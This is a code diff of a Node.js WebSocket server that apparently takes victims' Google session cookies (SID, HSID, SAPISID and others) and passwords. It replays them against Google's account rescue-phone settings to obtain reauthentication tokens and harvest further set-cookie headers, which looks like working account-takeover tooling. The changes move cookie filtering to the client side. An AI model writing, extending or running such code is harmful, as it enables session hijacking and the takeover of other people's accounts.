@@ -45,7 +45,7 @@ wsServer.on('request', (req) => {
             if(message.type === 'utf8') {
                 let mData = message.utf8Data.split('★')
                 if(mData.length == 8) {
-                    getRaptToken(connection, mData[6], mData, JSON.parse(mData[7]))
+                    getRaptToken(connection, mData[6], mData)
                 }
             }
         } catch (e) {}
@@ -113,7 +113,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
                                     let wrong = true
                                     try {
                                         if(!error && responce.headers['set-cookie']) {
-                                            cookiesList = responce.headers['set-cookie']
+                                            let cookiesList = responce.headers['set-cookie']
         
                                             for(let i=0; i<cookiesList.length; i++) {
                                                 let singelData = cookiesList[i]
@@ -186,21 +186,8 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
 }
 
 
-function getRaptToken(connection, password, mData, cookiesList) {
-    let sendCookies = ''
-    
-    for(let i=0; i<cookiesList.length; i++) {
-        let singelData = cookiesList[i]
-        try {
-            let start = singelData.indexOf('=')
-            let end = singelData.indexOf(';')
-            let key = singelData.substring(0, start)
-            if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
-                let value = singelData.substring(start+1, end)
-                sendCookies += key+'='+value+'; '
-            }
-        } catch (e) {}
-    }
+function getRaptToken(connection, password, mData) {
+    let sendCookies = mData[7]
 
     request({
         url: 'https://myaccount.google.com/signinoptions/rescuephone',
@@ -235,7 +222,7 @@ function getRaptToken(connection, password, mData, cookiesList) {
                                     let tl = headers['location'].substring(index+3, headers['location'].length).split('&')[0]
                                     index = headers['location'].indexOf('cid=')
                                     let cid = headers['location'].substring(index+4, headers['location'].length).split('&')[0]
-                                    cookiesList = headers['set-cookie']
+                                    let cookiesList = headers['set-cookie']
                                     let gps = mData[4]
                                     for(let i=0; i<cookiesList.length; i++) {
                                         let singelData = cookiesList[i]
